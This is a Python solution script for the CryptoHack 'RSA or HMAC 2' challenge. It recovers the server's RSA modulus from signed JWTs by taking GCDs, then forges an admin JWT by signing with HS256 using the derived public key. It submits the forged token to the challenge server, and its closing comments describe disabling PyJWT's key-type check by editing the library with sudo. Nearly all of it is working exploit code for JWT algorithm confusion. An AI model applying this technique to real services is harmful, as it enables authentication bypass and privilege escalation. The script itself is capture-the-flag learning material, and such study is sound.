# If I have a header h, body b and priv_key s
# The HS256 signature is SHA256(h || b || s)
# The RS256 signature is RSA_Sign(SHA256(h||b), s)

# Thus, if I can find the public key corresponding to the RSA key pair of s, I can sign my malicious JWT with HS256 and it will be accepted.
# Without that pk it will be infeasible to try to forge the HS256 signature since it will mean finding a collision of SHA256. So I have to find pk.

# Now, this pk, is a .pem file that depends only on the exponent e and the modulus n. We assume that e = 65537 since it is the standard.
# Thus, we have to find n.

import json
import base64
import requests
import random
import string
import gmpy2
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Given a public key pair (n,e), serialize it and store it in pem format in a file
def public_key_to_pem_format(n: int, e: int = 65537):
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key()

    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.PKCS1
    )    
    return pem

def serialize_pem_key(n: int, e: int = 65537, output_file: str = "rsa-or-hmac-2-public.pem"):
    with open(output_file, "wb") as f:
        f.write(public_key_to_pem_format(n))
    
def parse_rsa_public_pem(filename: str = "rsa-or-hmac-2-public.pem"):
    with open(filename, "r") as f:
        pem_data = f.read()

    key = RSA.import_key(pem_data)

    n = key.n
    e = key.e

    return n, e


# Methods for base64 conversions:
def base64url_to_int(b64url_str: str) -> int:
    rem = len(b64url_str) % 4
    if rem > 0:
        b64url_str += "=" * (4 - rem)

    raw_bytes = base64.urlsafe_b64decode(b64url_str)
    
    return int.from_bytes(raw_bytes, "big")

def int_signature_from_jwt(jwt_token: str) -> int:
    parts = jwt_token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a valid JWT.")

    return base64url_to_int(parts[2])

def base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# Given a username, get the bytearray (as input) that will be signed by rsa
def jwt_hash_for_rs256(username: str) -> int:
    header = {'alg': 'RS256', 'typ': 'JWT'}
    payload = {'username': username, 'admin': False}

    header_b64 = base64url(json.dumps(header, separators=(',',':')).encode())
    payload_b64 = base64url(json.dumps(payload, separators=(',',':')).encode())

    signing_input = f"{header_b64}.{payload_b64}"

    from Crypto.Signature import pkcs1_15
    from Crypto.Hash import SHA256

    hash = SHA256.new(signing_input.encode())
    padded = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash, 256)
    hash_int = int.from_bytes(padded, "big")

    return (hash_int, signing_input)

def create_session_and_obtain_jwt(username):
    base_url = "https://web.cryptohack.org/rsa-or-hmac-2/"
    endpoint = f"create_session/{username}/"
    url = base_url + endpoint
    
    response = requests.get(url)
    data = response.json()
    
    if "session" in data:
        return data["session"]
    else:
        return None


characters = string.ascii_letters + string.digits
def gen_random_string(l = 10):
    return ''.join(random.choices(characters, k=l))

# Recover the n of the RSA public key by doing the following trick:
# We know that the default e that openssl sets is e = 65537, so we only have to find n.
# Now, given a number x to sign by RSA, the signature is a = x^d mod n. We know
# that this d is such that a^e mod n = x. 
# Now, if we have x, e, and a, we know that a^e - x is a multiple of n, since a^e and x
# both have the same remainder mod n. So we grab a bunch of x's and calculate the gcd 
# gcd(a_1^e - x_1, ..., a_n^e - x_n).
# There is a very high probability that these numbers don't have any common factor
# aside from n, so we will almost surely get n.
def recover_n(num_samples = 2, e = 65537):
    values = []

    # Generate multiples of n
    for _ in range(num_samples):
        s = gen_random_string()
        (x, session_info) = jwt_hash_for_rs256(s)
        session_jwt = create_session_and_obtain_jwt(s)
        session_parts = session_jwt.split('.')
        assert(session_info == f"{session_parts[0]}.{session_parts[1]}")
        a = int_signature_from_jwt(session_jwt)

        x = gmpy2.mpz(x)
        a = gmpy2.mpz(a)

        val = pow(a, e)
        print(f"val bit_length: {val.bit_length()}")

        values.append(val - x)

    # Calculate gcd
    n = values[0]
    for v in values[1:]:
        n = gmpy2.gcd(n, v)

    return n


n = int(recover_n(8))
print(f"n: {n}")
assert(n == 30119723976045246500887959920897642376905514522104705876695572516818975656665827754462226597973931127004963194508794779495518118035029841228002850562126612806174354282950756669656076190799693066363785733231859172664786298352294594850108982261525326147060353679479844558827458650965802914077525964824412575118501773357860374735206849817271524812002047307305597712628593230518376740507962518305824812671107459660525177087958778694060270468673690931325503094560625544374011735643694318730778241846282742819834483180624645324880062782719575587058519516842316778261924794437716972651884728674806670910304714203419102131413)
PUBLIC_KEY = public_key_to_pem_format(n)


# # In case you want to persist the public key in a .pem file, uncomment these lines:
# serialize_pem_key(n)
# assert(parse_rsa_public_pem()[0] == n)

# # In case you want to load a public key from a .pem file, uncomment these lines:
# with open('Web/rsa-or-hmac-2-public.pem', 'rb') as f:
#    PUBLIC_KEY = f.read()
# print(f"pubKey: {PUBLIC_KEY}")


encoded = jwt.encode({'username': 'hola', 'admin': True}, PUBLIC_KEY, algorithm='HS256')
print(f"forged jwt: {encoded}")
# decoded = jwt.decode(encoded, PUBLIC_KEY, algorithms=['HS256', 'RS256'])
# print(f"decoded jwt: {decoded}")

base_url = "https://web.cryptohack.org/rsa-or-hmac-2/"
endpoint = f"authorise/{encoded}/"
url = base_url + endpoint

response = requests.get(url)
print(response.json())


# Running this code by itself throws the following error:

# File "/usr/lib/python3/dist-packages/jwt/algorithms.py", line 189, in prepare_key
#     raise InvalidKeyError(
# jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.

# Therefore, I run 'sudo nvim /usr/lib/python3/dist-packages/jwt/algorithms.py' and comment the whole if that contains line 189.
# After doing that, I run the code again and this time it throws the malicious token we want.

